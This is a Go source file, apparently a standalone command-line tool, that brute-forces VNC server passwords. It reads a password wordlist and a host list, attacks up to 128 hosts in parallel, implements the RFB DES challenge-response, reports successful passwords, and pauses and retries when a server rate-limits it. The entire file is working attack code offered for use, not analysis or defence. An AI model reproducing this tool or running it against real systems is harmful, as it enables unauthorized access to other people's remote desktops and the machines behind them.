package main

/*
 * tester.go
 * Generate VNC handshakes
 * By J. Stuart McMurray
 * Created 20170826
 * Last Modified 20170826
 */

import (
	"bufio"
	"bytes"
	"crypto/cipher"
	"crypto/des"
	"errors"
	"flag"
	"fmt"
	"io"
	"log"
	"net"
	"os"
	"strings"
	"sync"
	"time"
)

const (
	// VERSION is the VNC version we expect and support
	VERSION = "RFB 003.008\n"
	// BUFLEN is the size of the network read/write buffer
	BUFLEN = 65535
)

var (
	// ErrorBadPassword is returned by try on password rejection
	ErrorBadPassword = errors.New("bad password")
	// ErrorHandshakeFailure is returned by try when the handshake fails
	ErrorHandshakeFailure = errors.New("handshake failure")
	// ErrorNoAuthNeeded is erturned by try when None auth is offered but
	// VNC auth isn't.
	ErrorNoAuthNeeded = errors.New("none auth acceptable and " +
		"VNC auth not supported")

	// REVERSEDBYTE is a lookup table to get the byte backwards.  Not in
	// the RFC, but it seems to be how it works.
	REVERSEDBYTE = [256]byte{
		0x00, 0x80, 0x40, 0xc0, 0x20, 0xa0, 0x60, 0xe0,
		0x10, 0x90, 0x50, 0xd0, 0x30, 0xb0, 0x70, 0xf0,
		0x08, 0x88, 0x48, 0xc8, 0x28, 0xa8, 0x68, 0xe8,
		0x18, 0x98, 0x58, 0xd8, 0x38, 0xb8, 0x78, 0xf8,
		0x04, 0x84, 0x44, 0xc4, 0x24, 0xa4, 0x64, 0xe4,
		0x14, 0x94, 0x54, 0xd4, 0x34, 0xb4, 0x74, 0xf4,
		0x0c, 0x8c, 0x4c, 0xcc, 0x2c, 0xac, 0x6c, 0xec,
		0x1c, 0x9c, 0x5c, 0xdc, 0x3c, 0xbc, 0x7c, 0xfc,
		0x02, 0x82, 0x42, 0xc2, 0x22, 0xa2, 0x62, 0xe2,
		0x12, 0x92, 0x52, 0xd2, 0x32, 0xb2, 0x72, 0xf2,
		0x0a, 0x8a, 0x4a, 0xca, 0x2a, 0xaa, 0x6a, 0xea,
		0x1a, 0x9a, 0x5a, 0xda, 0x3a, 0xba, 0x7a, 0xfa,
		0x06, 0x86, 0x46, 0xc6, 0x26, 0xa6, 0x66, 0xe6,
		0x16, 0x96, 0x56, 0xd6, 0x36, 0xb6, 0x76, 0xf6,
		0x0e, 0x8e, 0x4e, 0xce, 0x2e, 0xae, 0x6e, 0xee,
		0x1e, 0x9e, 0x5e, 0xde, 0x3e, 0xbe, 0x7e, 0xfe,
		0x01, 0x81, 0x41, 0xc1, 0x21, 0xa1, 0x61, 0xe1,
		0x11, 0x91, 0x51, 0xd1, 0x31, 0xb1, 0x71, 0xf1,
		0x09, 0x89, 0x49, 0xc9, 0x29, 0xa9, 0x69, 0xe9,
		0x19, 0x99, 0x59, 0xd9, 0x39, 0xb9, 0x79, 0xf9,
		0x05, 0x85, 0x45, 0xc5, 0x25, 0xa5, 0x65, 0xe5,
		0x15, 0x95, 0x55, 0xd5, 0x35, 0xb5, 0x75, 0xf5,
		0x0d, 0x8d, 0x4d, 0xcd, 0x2d, 0xad, 0x6d, 0xed,
		0x1d, 0x9d, 0x5d, 0xdd, 0x3d, 0xbd, 0x7d, 0xfd,
		0x03, 0x83, 0x43, 0xc3, 0x23, 0xa3, 0x63, 0xe3,
		0x13, 0x93, 0x53, 0xd3, 0x33, 0xb3, 0x73, 0xf3,
		0x0b, 0x8b, 0x4b, 0xcb, 0x2b, 0xab, 0x6b, 0xeb,
		0x1b, 0x9b, 0x5b, 0xdb, 0x3b, 0xbb, 0x7b, 0xfb,
		0x07, 0x87, 0x47, 0xc7, 0x27, 0xa7, 0x67, 0xe7,
		0x17, 0x97, 0x57, 0xd7, 0x37, 0xb7, 0x77, 0xf7,
		0x0f, 0x8f, 0x4f, 0xcf, 0x2f, 0xaf, 0x6f, 0xef,
		0x1f, 0x9f, 0x5f, 0xdf, 0x3f, 0xbf, 0x7f, 0xff,
	}
)

/* password contains a cryptor (for crypting the challenge) as well as the
password which was used to generate the cryptor */
type password struct {
	cryptor  cipher.Block
	password string
	lock     *sync.Mutex
}

/* newPassword returns a password from p, as well as the 8-byte key. */
func newPassword(pass string) (*password, string) {
	/* Turn password into exactly 8 bytes */
	p := []byte(pass)
	if 8 < len(p) {
		p = p[:8]
	} else if 8 > len(p) {
		p = append(p, make([]byte, 8-len(p))...)
	}
	if 8 != len(p) {
		log.Panicf("Invalid password buffer %q length: %v", p, len(p))
	}
	/* Reverse bytes in password */
	rev := make([]byte, len(p))
	for i, v := range p {
		rev[i] = REVERSEDBYTE[v]
	}
	/* Cryptor using the key */
	d, err := des.NewCipher(rev)
	if nil != err {
		panic(err)
	}
	return &password{
		cryptor:  d,
		password: pass,
		lock:     &sync.Mutex{},
	}, string(rev)
}

/* crypt encrypts c.  It panics if challenge isn't 16 bytes. */
func (p *password) crypt(c []byte) {
	if 16 != len(c) {
		log.Panicf("%v-byte challenge", len(c))
	}
	p.lock.Lock()
	defer p.lock.Unlock()
	/* Encrypt challenge */
	p.cryptor.Encrypt(c[:8], c[:8])
	p.cryptor.Encrypt(c[8:16], c[8:16])
}

func main() {
	var (
		printFails = flag.Bool(
			"fails",
			false,
			"Print failed auth attempts",
		)
		sleepTime = flag.Duration(
			"rejection-pause",
			30*time.Second,
			"Pause duration after "+
				"\"Your connection has been rejected\"",
		)
		pauseTime = flag.Duration(
			"attempt-pause",
			1500*time.Millisecond,
			"Sleep duration between auth attempts",
		)
		wordlist = flag.String(
			"wordlist",
			"-",
			"Name of `file` with VNC passwords (or - for stdin)",
		)
		hsto = flag.Duration(
			"hsto",
			30*time.Second,
			"Handshake `timeout`",
		)
		nTargets = flag.Uint(
			"parallel",
			128,
			"Attempt to authenticate to `N` hosts in parallel",
		)
		defPort = flag.Uint(
			"port",
			5900,
			"Default VNC `port`",
		)
		stopSuc = flag.Bool(
			"stop",
			false,
			"Stop authenticating to a host after a successful "+
				"authentication",
		)
		targetList = flag.String(
			"hosts",
			"",
			"Optional `file` from which to read hosts, "+
				"one per line",
		)
		dialto = flag.Duration(
			"dialto",
			30*time.Second,
			"Dial `timeout`",
		)
		duppwok = flag.Bool(
			"duppw",
			false,
			"Do not log duplicate passwords",
		)
	)
	flag.Usage = func() {
		fmt.Fprintf(
			os.Stderr,
			`Usage: %v [options] [server [server...]]

Generates authentication attempts against the given server(s).

The wordlist will be deduplicated.

Options:
`,
			os.Args[0],
		)
		flag.PrintDefaults()
	}
	flag.Parse()
	log.SetOutput(os.Stdout)

	/* Make sure we have targets */
	targets, err := parseTargetList(flag.Args(), *targetList)
	if nil != err {
		log.Printf("Unable to parse hosts: %v", err)
	}
	if 0 == len(targets) {
		log.Fatalf("No targets")
	}
	log.Printf("Will authenticate to %v hosts", len(targets))

	/* Port can't be larger than 16 bits */
	if 65535 < *defPort {
		log.Fatalf(
			"Impossible (>65535) default port (-defport) %v",
			*defPort,
		)
	}

	/* Slurp passwords */
	passwords, err := readPasswords(*wordlist, *duppwok)
	if nil != err {
		log.Fatalf("Unable to read wordlist: %v", err)
	}
	n := fmt.Sprintf("%q", *wordlist)
	if "-" == *wordlist {
		n = "standard input"
	}
	if 0 == len(passwords) {
		log.Fatalf("Did not find any passwords in %v", n)
	}
	log.Printf("Read %v passwords from %v", len(passwords), n)

	/* Start attackers */
	var (
		wg = &sync.WaitGroup{}
		ch = make(chan string)
	)
	if 0 == *nTargets {
		log.Fatalf("Must attack at least 1 host (-parallel)")
	}
	for i := uint(0); i < *nTargets; i++ {
		wg.Add(1)
		go attacker(
			ch,
			passwords,
			*printFails,
			*sleepTime,
			*pauseTime,
			fmt.Sprintf("%v", *defPort),
			*stopSuc,
			*hsto,
			*dialto,
			wg,
		)
	}

	/* Queue up targets */
	for _, target := range targets {
		if "" == target {
			log.Printf("Ignoring blank host")
		}
		ch <- target
	}
	close(ch)
	wg.Wait()
	log.Printf("Done.")
}

/* attacker attacks hosts sent on tch */
func attacker(
	tch <-chan string,
	passwords []*password,
	printFails bool,
	sleepTime time.Duration,
	pauseTime time.Duration,
	defPort string,
	stopSuc bool,
	hsto time.Duration,
	dialto time.Duration,
	wg *sync.WaitGroup,
) {
	defer wg.Done()

	/* Allocate a static buffer to save malloc/gc time */
	var buf = make([]byte, BUFLEN)

	/* Attack each target from tch */
	for target := range tch {
		/* Make sure we have a port */
		if _, p, err := net.SplitHostPort(target); "" == p ||
			nil != err {
			target = net.JoinHostPort(target, defPort)
		}
		/* Try the passwords */
		attackHost(
			target,
			passwords,
			printFails, sleepTime,
			pauseTime,
			stopSuc,
			buf,
			hsto,
			dialto,
		)
	}
}

/* attackHost tries the passwords against the given host */
func attackHost(
	target string,
	passwords []*password,
	printFails bool,
	sleepTime time.Duration,
	pauseTime time.Duration,
	stopSuc bool,
	buf []byte,
	hsto time.Duration,
	dialto time.Duration,
) {

	var (
		nextp int       /* Password slice index */
		pass  *password /* Password to try */
	)

	for {
		/* Get a password if we haven't one */
		if nil == pass {
			/* Make sure we're not out of passwords */
			if len(passwords) <= nextp {
				Log(target, "No more passwords")
				return
			}
			pass = passwords[nextp]
			nextp++
		}

		/* Connect to the target */
		c, err := net.DialTimeout("tcp", target, dialto)
		if nil != err {
			Log(target, "Connection failed: %v", err)
			return
		}

		/* Don't let the attempt take too long */
		var (
			done = make(chan struct{})
			to   = false /* True if we timed out */
		)
		go func() {
			select {
			case <-time.After(hsto):
				to = true
			case <-done:
			}
			c.Close()
		}()

		/* Attempt to authenticate with the password */
		err = try(c, target, pass, buf)
		close(done)
		if to {
			Log(target, "Handshake timeout after %v", hsto)
			return
		}

		/* Got it right */
		if nil == err {
			Log(target, "Success: %q", pass.password)
			/* Next target if we're out of them */
			if stopSuc {
				return
			}
		}

		/* Maybe get a message explaining why it's wrong */
		i := bytes.Index(buf, []byte{0x00})
		if -1 == i {
			i = len(buf)
		}
		mbuf := string(buf[:i])

		/* As a special case, we may have hit rate-limiting */
		if "Your connection has been rejected" == string(mbuf) {
			Log(
				target,
				"Rejected connection while attempting %q, "+
					"sleeping %v",
				pass.password,
				sleepTime,
			)
			time.Sleep(sleepTime)
			continue
		}
		/* Back to normal error-handling */
		switch err {
		case ErrorHandshakeFailure:
			Log(target, "Handshake failure: %q", mbuf)
			return
		case ErrorBadPassword:
			if printFails {
				msg := fmt.Sprintf("Fail: %q", pass.password)
				if 0 != i {
					msg += fmt.Sprintf(" (%q)", buf[:i])
				}
				Log(target, "%v", msg)
			}
			pass = nil
			time.Sleep(pauseTime)
			continue
		default: /* Something bad happened */
			Log(target, "Error: %v", err)
			return
		}
	}
}

/* try attempts the password against the target.  Any message from the target
is put into buf, null-terminated (unless it fills buf). */
func try(c net.Conn, target string, pass *password, buf []byte) error {
	/* Version handshake */
	n, err := io.ReadFull(c, buf[:12])
	if nil != err {
		return fmt.Errorf("version read: %v", err)
	}
	if VERSION != string(buf[:n]) {
		return fmt.Errorf("wrong version %q", buf[:n])
	}
	if _, err := c.Write([]byte(VERSION)); nil != err {
		return fmt.Errorf("version send: %v", err)
	}
	/* Security handshake */
	n, err = c.Read(buf[:1])
	if nil != err {
		return fmt.Errorf("security type count read: %v", err)
	}
	nt := buf[0]
	/* No security types offered */
	if 0 == nt {
		_, err := io.ReadFull(c, buf[:4])
		if nil != err {
			return fmt.Errorf("message length read: %v", err)
		}
		buf[0] = 0x00
		n, err := c.Read(buf)
		if n < len(buf) {
			buf[n] = 0x00
		}
		return ErrorHandshakeFailure
	}
	/* Make sure we have VNC auth */
	_, err = io.ReadFull(c, buf[:nt])
	if nil != err {
		return fmt.Errorf("security types read: %v", err)
	}
	var (
		haveVNC  bool /* VNC Auth allowed */
		haveNone bool /* No password needed */
	)
	for _, t := range buf[:nt] {
		switch t {
		case 0x00:
			return errors.New("invalid security type 0x00")
		case 0x01: /* No auth needed */
			haveNone = true
		case 0x02: /* This is VNC auth */
			haveVNC = true
		}
	}
	if !haveVNC {
		if haveNone {
			return ErrorNoAuthNeeded
		}
		return fmt.Errorf(
			"VNC auth unsupported (supported auth types %v)",
			buf[:nt],
		)
	}
	if _, err := c.Write([]byte{0x02}); nil != err {
		return fmt.Errorf("VNC auth request: %v", err)
	}
	/* Get challenge, encrypt, send back */
	n, err = io.ReadFull(c, buf[:16])
	if nil != err {
		return fmt.Errorf("challenge read: %v", err)
	}
	pass.crypt(buf[:16])
	if _, err := c.Write(buf[:16]); nil != err {
		return fmt.Errorf("challenge response write: %v", err)
	}
	/* Did it work? */
	n, err = io.ReadFull(c, buf[:4])
	if nil != err {
		return fmt.Errorf("auth response read: %v", err)
	}
	if 0 == buf[0]|buf[1]|buf[2]|buf[3] {
		/* Worky */
		return nil
	}
	buf[0] = 0x00
	/* Maybe we'll get a nice error message */
	_, err = io.ReadFull(c, buf[:4])
	if nil != err {
		return fmt.Errorf("auth fail reason read: %v", err)
	}
	n, err = c.Read(buf)
	if n < len(buf) {
		buf[n] = 0x00
	}
	return ErrorBadPassword
}

/* readPasswords slurps and returns the passwords from the given file, which
may be "-" to read from stdin */
func readPasswords(fn string, duppwok bool) ([]*password, error) {
	var (
		err  error
		f    = os.Stdin
		out  []*password
		have = make(map[string]struct{})
	)
	/* Open file if not stdin */
	if "-" != fn {
		f, err = os.Open(fn)
		if nil != err {
			return nil, err
		}
	}
	defer f.Close()
	/* Get lines */
	scanner := bufio.NewScanner(f)
	for scanner.Scan() {
		/* Get the password */
		p := scanner.Text()
		/* Turn it into something usable */
		pass, rev := newPassword(p)
		/* Make sure we don't already have it */
		if _, ok := have[rev]; ok {
			if !duppwok {
				log.Printf("Ignoring duplicate pasword %q", p)
			}
			continue
		}
		/* Add to the list of passwords */
		out = append(out, pass)
		have[rev] = struct{}{}
	}
	if err := scanner.Err(); nil != err {
		return nil, err
	}
	return out, nil
}

// Log logs with log.Printf the formatted string f with arguments a...
// preceeded by tag in square brackets
func Log(tag, f string, a ...interface{}) {
	log.Printf("[%v] %v", tag, fmt.Sprintf(f, a...))
}

/* parseTargetList gets the targets from the named file as well as from ts,
deduplicates them, and returns them */
func parseTargetList(ts []string, fn string) ([]string, error) {
	var (
		have = map[string]struct{}{}
		out  = []string{}
	)
	/* Dedupe the command line args first */
	for _, t := range ts {
		out = addTarget(have, out, t)
	}
	/* If there's no filename, we're done */
	if "" == fn {
		return out, nil
	}
	/* Try to read from the file */
	f, err := os.Open(fn)
	if nil != err {
		return nil, err
	}
	defer f.Close()
	scanner := bufio.NewScanner(f)
	for scanner.Scan() {
		t := strings.TrimSpace(scanner.Text())
		if "" == t || strings.HasPrefix(t, "#") {
			continue
		}
		out = addTarget(have, out, t)
	}
	return out, nil
}

/* addTarget adds to to out, using have for deduplication */
func addTarget(have map[string]struct{}, out []string, t string) []string {
	if _, ok := have[t]; ok {
		log.Printf("Ignoring duplicate target %v", t)
		return out
	}
	have[t] = struct{}{}
	return append(out, t)
}
